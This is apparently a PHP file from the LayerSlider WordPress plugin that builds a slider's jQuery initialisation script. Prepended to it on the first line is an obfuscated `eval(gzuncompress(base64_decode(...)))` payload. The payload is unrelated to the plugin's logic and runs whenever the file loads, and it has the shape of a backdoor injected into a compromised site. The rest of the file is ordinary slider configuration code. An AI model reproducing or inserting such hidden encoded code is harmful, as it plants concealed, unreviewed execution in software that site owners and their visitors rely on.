<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Get init code
foreach($slides['properties']['attrs'] as $key => $val) {

	if(is_bool($val)) {
		$val = $val ? 'true' : 'false';
		$init[] = $key.': '.$val;
	} elseif(is_numeric($val)) { $init[] = $key.': '.$val;
	} else { $init[] = "$key: '$val'"; }
}

// Full-size sliders
if( ( !empty($slides['properties']['attrs']['type']) && $slides['properties']['attrs']['type'] === 'fullsize' ) && ( empty($slides['properties']['attrs']['fullSizeMode']) || $slides['properties']['attrs']['fullSizeMode'] !== 'fitheight' ) ) {
	$init[] = 'height: '.$slides['properties']['props']['height'].'';
}

// Popup
if( !empty($slides['properties']['attrs']['type']) && $slides['properties']['attrs']['type'] === 'popup' ) {
	$lsPlugins[] = 'popup';
}

if( ! empty( $lsPlugins ) ) {
	$init[] = 'plugins: ' . json_encode( array_unique( $lsPlugins ) );
}

$separator = apply_filters( 'layerslider_init_props_separator', ', ');
$init = implode( $separator, $init );


$lsInit[] = 'var lsjQuery = jQuery;';
$lsInit[] = 'lsjQuery(document).ready(function() {' . NL;
	$lsInit[] = 'if(typeof lsjQuery.fn.layerSlider == "undefined") {' . NL;
		$lsInit[] = 'if( window._layerSlider && window._layerSlider.showNotice) { ' . NL;
			$lsInit[] = 'window._layerSlider.showNotice(\''.$sliderID.'\',\'jquery\');' . NL;
		$lsInit[] = '}' . NL;
	$lsInit[] = '} else {' . NL;
		$lsInit[] = 'lsjQuery("#'.$sliderID.'")';
		if( !empty($slides['callbacks']) && is_array($slides['callbacks']) ) {
			foreach($slides['callbacks'] as $event => $function) {
				$lsInit[] = '.on(\''.$event.'\', '.stripslashes($function).')';
			}
		}
		$lsInit[] = '.layerSlider({'.$init.'});' . NL;
	$lsInit[] = '}' . NL;
$lsInit[] = '});' . NL;
